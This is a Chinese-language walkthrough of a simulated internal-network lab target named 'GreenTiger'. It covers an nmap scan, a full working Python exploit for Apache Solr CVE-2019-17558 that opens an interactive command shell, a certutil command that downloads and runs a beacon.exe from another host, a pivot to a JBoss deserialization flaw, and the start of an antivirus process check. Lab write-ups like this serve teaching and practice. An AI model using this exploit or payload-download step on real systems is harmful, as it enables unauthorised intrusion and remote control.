---
title: 内网仿真靶机《GreenTiger》wp
url: https://mp.weixin.qq.com/s/32SvDRiRY-7p954C5fxm3w
source: Doonsec's feed
date: 2026-06-22
fetch_date: 2026-06-23T06:04:47.153835
---

# 内网仿真靶机《GreenTiger》wp

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/yk22Q4j16wELzCDyuJJWh4D9PPFR2iadiciaID6g4s2wGB4IP3QAdLl7yt3VxWnnb38PAsb1IRYhWicnVBbZt4wWH9gaJ9fVSficBGdgpIViaz9tg/0?wx_fmt=jpeg)

# 内网仿真靶机《GreenTiger》wp

原创

plag
plag

红队蓝军

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 第一台入口web

首先扫描一下

```
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linenmap -A 172.5.5.5
```

Starting Nmap 7.95 ( https://nmap.org )Nmap scan report for 172.5.5.5Host is up (0.058s latency).Not shown: 995 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION80/tcp   open  http          Apache Solr| http-title: Solr Admin|_Requested resource was http://172.5.5.5/solr/135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds?5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:|_clock-skew: -8h00m00s| smb2-time:|   date: 2025-07-01T19:20:13|_  start_date: N/A| smb2-security-mode:|   3:1:1:|_    Message signing enabled but not required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 113.00 seconds
```

访问172.5.5.5得到为solr框架，版本为8.2.0

![](https://mmbiz.qpic.cn/mmbiz_png/yk22Q4j16wFcfc2N4wvy4vEBibAUnuXupqVIYDTvFUBukXavqiccDic55v8yhJoKhxWXqaIm4gN0qNGBqTVfHICI2XV5EoeFXO0YLX5895VRzc/640?wx_fmt=png&from=appmsg)

直接该版本漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/yk22Q4j16wFQJCOGfO37y3G6xlmnxKicsaQADB5bJ9iaoZibdt8aypmv2gPM2g0icbVwzYYk8yAekFibpHI5J9Pib11VvsMVfD12K24kFGLBHPTiaI/640?wx_fmt=png&from=appmsg)

直接用CVE-2019-17558的exp获得shell

```
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line#!/usr/bin/python3
```

#-*- coding:utf-8 -*-# author:zhzyker# from:https://github.com/zhzyker/exphub# telegram:t.me/zhzyker
import requestsimport sysimport json
if len(sys.argv)!=2:    print('+------------------------------------------------------------+')    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub       +')    print('+      Apache Solr Velocity Commons Remote Code Execution    +')    print('+------------------------------------------------------------+')    print('+ USE: python3 cve-2019-17558_cmd.py <url>                   +')    print('+ EXP: python3 cve-2019-17558_cmd.py http://1.1.1.1:8983     +')    print('+ VER: Apache Solr 5.0.0 - 8.3.1                             +')    print('+------------------------------------------------------------+')    sys.exit(0)url = sys.argv[1]
core_url = url + "/solr/admin/cores?indexInfo=false&wt=json"try:    r = requests.request("GET", url=core_url, timeout=10)    core_name = list(json.loads(r.text)["status"])[0]    print ("[+] GET API: "+url+"/solr/"+core_name+"/config")except:    print ("[-] Target Not Vuln Good Luck")    sys.exit(0)

api_url = url + "/solr/" +core_name+ "/config"headers = {"Content-Type": "application/json"}set_api_data ="""{  "update-queryresponsewriter": {    "startup": "lazy",    "name": "velocity",    "class": "solr.VelocityResponseWriter",    "template.base.dir": "",    "solr.resource.loader.enabled": "true",    "params.resource.loader.enabled": "true"  }}"""api = requests.request("POST", url=api_url, data=set_api_data, headers=headers)code = str(api.status_code)if api.status_code == 200:    print ("[+] <HTTP" +code+ "> SET API Success")else:    print ("[-] <HTTP" +code+ "> SET API Failed Good Luck")    sys.exit(0)

def do_exp(cmd):    vuln_url = url+"/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+cmd+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"    r = requests.request("GET", vuln_url)    print (r.text)
while 1:    cmd = input("Shell >>> ")    if cmd == "exit" : exit(0)    do_exp(cmd)
```

```
```
ounter(linepython3 cve-2019-17558_cmd.py http://172.5.5.5
```
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yk22Q4j16wHPExK7IPLdmxIWtKic8EHyzzTeOnfjn8ST8jnq99WIlOWxt9Onk18wmXeYRr2X4XBEbvEDibAGw3GINPibgotbfNv3keZ0Ee1GGo/640?wx_fmt=png&from=appmsg)

certutil下马，执行并上线

```
```
ounter(linecertutil -urlcache -split -f http://172.16.233.2/beacon.exe 1.exe
```
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yk22Q4j16wHiaJ4klUZfo3naEf18s5ibcHDDAic7ohQdRUSWowLozcrolU7MCdJ2mBt77mvC8WKpTmx6jrB3XqJaCluXaj1YHNFcX8fYT3qvSo/640?wx_fmt=png&from=appmsg)

获取flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yk22Q4j16wEfia43Wj67Eiacc4U4Y2zgqricYibyJk2ianibHarrHAgnEUNh29Pm0ZJlJlAUepsyzXtEtGxeTL6S1lIF0h611jn19j3jic7nBicSGzA/640?wx_fmt=png&from=appmsg)

# 内网web

信息搜集得到双网卡

![](https://mmbiz.qpic.cn/mmbiz_png/yk22Q4j16wERiaxe4FuafvNjIDyLyaI2HvegNSibyQ9dgh12YIyVaN0nPbAyf3E61mfia82gUmDicJrodB552k5BRBc30Vib5TzsyuibB9iasyWosc/640?wx_fmt=png&from=appmsg)

端口扫描得到存活ip为172.6.6.8，存在特征端口8080

![](https://mmbiz.qpic.cn/mmbiz_png/yk22Q4j16wF8PnmYGrm3czYOHjNmxPTDalUj1O2NRauF970H4edvSUep5nR4rNLYKST32aWWn39ule7b2QQ7F0mLPibe8kCompGEibYCQuWqU/640?wx_fmt=png&from=appmsg)

访问为jboss框架

![](https://mmbiz.qpic.cn/mmbiz_png/yk22Q4j16wGEvbiblAaLgRWbDuFrfISCX7IsuTJnLvpLVN432yxKK5IVsEunOc2vxxicI4tkNKUyBficxCARqktQ83QWbxoRuYDIexZzBKEcCo/640?wx_fmt=png&from=appmsg)

这里扫描jboss存在的漏洞得到jboss反序列化，system权限

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yk22Q4j16wEtibTB4PCp4pxqywKibAXYMuHmQicshicE2f3cSS9doZeo0ibyk8mTkYehhSZPaibp697SfjBBPGP6OSTq9UichL8jpYYdVT6QoBJcxk/640?wx_fmt=png&from=appmsg)

看下当前主机有没有av

```
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line映像名称                       PID 服务
```

========================= ======== ============================================System Idle Process              0 暂缺                                        System                           4 暂缺                                        smss.exe                       244 暂缺                                        csrss.exe                      332 暂缺                                        csrss.exe                      416 暂缺                                        wininit.exe                    432 暂缺                                        winlogon.exe                   464 暂缺         ...